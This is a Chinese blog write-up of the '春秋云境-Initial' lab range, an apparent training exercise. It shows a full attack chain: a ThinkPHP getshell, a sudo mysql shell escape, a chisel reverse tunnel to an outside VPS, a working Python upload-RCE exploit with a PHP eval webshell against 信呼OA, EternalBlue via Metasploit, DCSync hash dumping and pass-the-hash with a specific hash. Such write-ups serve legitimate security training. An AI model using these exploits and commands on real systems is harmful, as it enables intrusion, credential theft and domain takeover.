---
title: 春秋云境-Initial
subtitle:
date: 2025-03-14T14:19:42+08:00
slug: 8c9f848
draft: false
author:
  name: T1ng
  link:
  email:
  avatar: /images/avater.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 春秋云境
categories:
  - 春秋云境
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

<!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->

![](images/b26f9fd59f01b8c198e5d89cdbdbf684.png)
外网打点

``` Shell
fscan -h 39.98.109.170
```

![](images/75b7336bfeb8fcde6d1a76ac6635c29d.png)
ico发现是Thinkphp
![](images/41ad37689e7c7b7cd9893aa9c6b90712.png)
Thinkphp综合利用工具
![](images/2cda5015a42cc1de1e1120ad6bfd24c5.png)
Getshell并进行传马
![](images/8c6d010e7f90dc253b9eb9bc31fe0f7d.png)
蚁剑连接
![](images/a419d62e170b68d15c58f7164ccbc2af.png)
尝试读取root，发现并没有权限
![](images/adca8dffec2ddaf0527401de69b2c80a.png)
尝试提权，suid不可利用，尝试sudo提权
![](images/3ad1c22f4b574350cf9920e0eb4ce993.png)
mysql配置了免密使用，mysql暂时拿到root权限，使用mysql -e命令即可，使用mysql -e命令查找root用户中的flag文件

``` Shell
sudo mysql -e '\! find / -name flag*'
```

![](images/c52ffdced9ffb469cd2b9624247f0d6c.png)
发现flag01.txt文件
![](images/d1059562426618ba3782e70921d3249c.png)
读取内容

``` Shell
sudo mysql -e '\! cat /root/flag/flag01.txt'
```

![](images/4b618a54fab991c70107bc187ae1f37e.png)
扫描内网，上传fscan到`/tmp`，并给予权限
![](images/eaa9c7175e9f77c29a7ac109a5585429.png)

```
chmod 777 fscan
```

查看网卡信息，并进行扫描

``` Shell
ip addr
```

![](images/e6175cc57bbd5cf7570297c69597456f.png)

``` Shell
./fscan -h 172.22.1.0/24 >> fscan.txt
```

![](images/6fe3a60941b9399c5bf52ec1524ee90a.png)
从结果可以得到目标
172.22.1.2:DC域控  
172.22.1.21:Windows的机器并且存在MS17-010 漏洞  
172.22.1.18:信呼OA办公系统
接下来搭建frp内网穿透，vps当作跳板机
上传chisel到`/tmp`，给予权限并运行

```
靶机
./chisel client vps_ip:9001 R:0.0.0.0:9002:socks

vps
./chisel server -p 9001 --reverse
```

![](images/0522a523ca8072ddc8af35cc7bbb7a00.png)
![](images/c8d57b364422ae14f96414e69d36e252.png)
代理成功，尝试访问信呼OA
![](images/dac60f4ec4f7a92855a83e5f5817156d.png)
![](images/9fbfa2a2f1c89c51877ba54bdcbcd058.png)
尝试弱口令爆破进入管理系统admin/admin123，登陆以后信呼OA存在rce，直接用exp打

``` 1.php
<?php @eval($_POST['t1ng']);?>
```

两个文件须在同一目录下

``` exp.py
import requests


session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}


r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
print(id)
print(filepath)
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

![](images/6be8e70fb538aafca29943133c6f5ca7.png)
蚁剑设置代理，并且按照给出路径进行连接
![](images/7ee0b9505a2d9bf4e836c8fca17068e0.png)
![](images/998afd0e487b47cd6058be4ec10c939f.png)
在`C:/Users/Administrator/flag/flag02.txt`拿到第二部分flag
![](images/dd598f94e23105fdfb157f8b107c67c2.png)
先打172.22.1.21的MS17-010的永恒之蓝
配置一下kali虚拟机的socks5代理

```
vim /etc/proxychains4.conf

内容
socks5 vps_ip 9002 
```

接下来msf打永恒之蓝

```
proxychains4 msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
exploit
```

![](images/d57d574f0008bf9cb865cd235ee3c56d.png)
拿到SYSTEM权限，`load kiwi`调用mimikatz模块，获取域内用户hash

```
load kiwi
kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
```

![](images/808e5419b46d82bf8ffdc4dc9451ccc0.png)
用crackmapexec打PTH拿下域控

```
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

![](images/7f5326b1e7ce49a322bcd40960eff27d.png)
拿到第三段flag。

flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
